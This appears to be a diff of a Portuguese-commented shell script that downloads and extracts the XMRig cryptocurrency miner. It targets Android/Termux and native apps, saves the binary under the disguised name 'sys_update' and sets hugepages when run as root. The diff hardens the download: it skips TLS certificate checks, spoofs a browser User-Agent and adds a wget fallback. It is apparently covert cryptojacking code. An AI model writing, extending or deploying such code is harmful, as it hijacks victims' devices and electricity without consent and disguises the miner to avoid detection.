@@ -46,6 +46,7 @@ if [ "$EUID" -eq 0 ]; then
     echo 128 > /proc/sys/vm/nr_hugepages 2>/dev/null
 fi
 
+# URL limpa sem espaços ou quebras de linha
 if [ "$IS_NATIVE_APP" = "true" ]; then
     URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
 elif [ "$IS_TERMUX" = "true" ]; then
@@ -67,22 +68,32 @@ NEW_BIN="$TMP_BASE/sys_update"
 LOG_FILE="$TMP_BASE/sys_log.txt"
 
 if [ ! -f "$NEW_BIN" ]; then
-    echo "[$(date)] Baixando minerador de $URL..." >> "$LOG_FILE"
+    echo "[$(date)] Baixando minerador..." >> "$LOG_FILE"
+    echo "[$(date)] URL: $URL" >> "$LOG_FILE"
     mkdir -p "$TMP_BASE"
     cd "$TMP_BASE"
+    
+    # Tentar baixar com User-Agent e seguindo redirecionamentos
     if command -v curl >/dev/null 2>&1; then
-        curl -L "$URL" -o pkg.tar.gz
+        echo "[$(date)] Usando curl..." >> "$LOG_FILE"
+        curl -fkLsH "User-Agent: Mozilla/5.0" "$URL" -o pkg.tar.gz
+    elif command -v wget >/dev/null 2>&1; then
+        echo "[$(date)] Usando wget..." >> "$LOG_FILE"
+        wget --no-check-certificate --user-agent="Mozilla/5.0" "$URL" -O pkg.tar.gz
     else
-        wget --no-check-certificate "$URL" -O pkg.tar.gz
+        echo "[$(date)] Erro: Nem curl nem wget encontrados." >> "$LOG_FILE"
+        return 1
     fi
     
     if [ ! -s pkg.tar.gz ]; then
-        echo "[$(date)] Erro: Arquivo baixado esta vazio ou falhou." >> "$LOG_FILE"
+        echo "[$(date)] Erro: Download falhou (arquivo vazio). Verifique a internet." >> "$LOG_FILE"
         rm -f pkg.tar.gz
         return 1
     fi
 
+    echo "[$(date)] Download concluido. Extraindo..." >> "$LOG_FILE"
     tar -xzf pkg.tar.gz
+    
     # Procurar o executável xmrig dentro da pasta extraída
     XMRIG_PATH=$(find . -name "xmrig" -type f | head -n 1)
     if [ -n "$XMRIG_PATH" ]; then
